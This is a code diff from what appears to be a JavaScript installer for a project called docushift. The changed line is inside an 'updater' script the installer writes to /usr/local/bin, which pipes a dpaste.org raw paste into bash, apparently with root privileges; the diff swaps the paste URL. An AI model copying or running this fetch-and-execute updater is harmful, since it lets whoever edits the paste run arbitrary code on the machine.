@@ -141,7 +141,7 @@ const lines = [
   'tee /usr/local/bin/docushift-update >/dev/null << \'EOF_UPDATER\'',
   '#!/usr/bin/env bash',
   'cd /root/docushift 2>/dev/null || cd /root/Docpersian 2>/dev/null',
-  'curl -sL "https://dpaste.org/N1gVz/raw" | bash',
+  'curl -sL "https://dpaste.org/sKKy2/raw" | bash',
   'EOF_UPDATER',
   'chmod +x /usr/local/bin/docushift-update 2>/dev/null || true',
   '',
